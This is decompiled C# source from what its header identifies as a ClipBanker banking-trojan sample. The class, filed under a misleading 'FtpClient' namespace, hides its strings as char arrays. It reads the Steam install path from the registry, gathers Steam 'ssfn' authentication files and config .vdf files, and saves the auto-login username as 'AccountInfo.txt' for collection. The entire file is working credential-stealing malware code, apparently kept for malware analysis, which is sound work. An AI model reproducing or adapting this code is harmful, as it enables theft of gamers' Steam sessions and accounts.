// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.SG
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Info;
using Microsoft.Win32;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace FtpClient.Data.Applications
{
  public static class SG
  {
    public static List<InfoClass3> GetFiles()
    {
      List<InfoClass3> files = new List<InfoClass3>();
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[20]
        {
          'S',
          'o',
          'f',
          't',
          'w',
          'a',
          'r',
          'e',
          '\\',
          'V',
          'a',
          'l',
          'v',
          'e',
          '\\',
          'S',
          't',
          'e',
          'a',
          'm'
        }));
        if (registryKey == null)
          return files;
        string empty = string.Empty;
        string str1 = registryKey.GetValue(new string(new char[9]
        {
          'S',
          't',
          'e',
          'a',
          'm',
          'P',
          'a',
          't',
          'h'
        })) as string;
        if (!Directory.Exists(str1))
          return files;
        foreach (string file in Directory.GetFiles(str1))
        {
          if (file.Contains(new string(new char[4]
          {
            's',
            's',
            'f',
            'n'
          })))
            files.Add(new InfoClass3()
            {
              Object3 = File.ReadAllBytes(file),
              Object1 = Path.GetFileName(file)
            });
        }
        foreach (string enumerateFile in Directory.EnumerateFiles(Path.Combine(str1, new string(new char[6]
        {
          'c',
          'o',
          'n',
          'f',
          'i',
          'g'
        }))))
        {
          if (enumerateFile.Contains(new string(new char[4]
          {
            '.',
            'v',
            'd',
            'f'
          })))
            files.Add(new InfoClass3()
            {
              Object3 = File.ReadAllBytes(enumerateFile),
              Object1 = Path.GetFileName(new string(new char[7]
              {
                'c',
                'o',
                'n',
                'f',
                'i',
                'g',
                '_'
              }) + enumerateFile)
            });
        }
        string str2 = registryKey.GetValue(new string(new char[13]
        {
          'A',
          'u',
          't',
          'o',
          'L',
          'o',
          'g',
          'i',
          'n',
          'U',
          's',
          'e',
          'r'
        })) as string;
        if (!string.IsNullOrWhiteSpace(str2))
          files.Add(new InfoClass3()
          {
            Object3 = Encoding.UTF8.GetBytes(new string(new char[6]
            {
              'U',
              's',
              'e',
              'r',
              ':',
              ' '
            }) + str2),
            Object1 = new string(new char[15]
            {
              'A',
              'c',
              'c',
              'o',
              'u',
              'n',
              't',
              'I',
              'n',
              'f',
              'o',
              '.',
              't',
              'x',
              't'
            })
          });
      }
      catch
      {
      }
      return files;
    }
  }
}
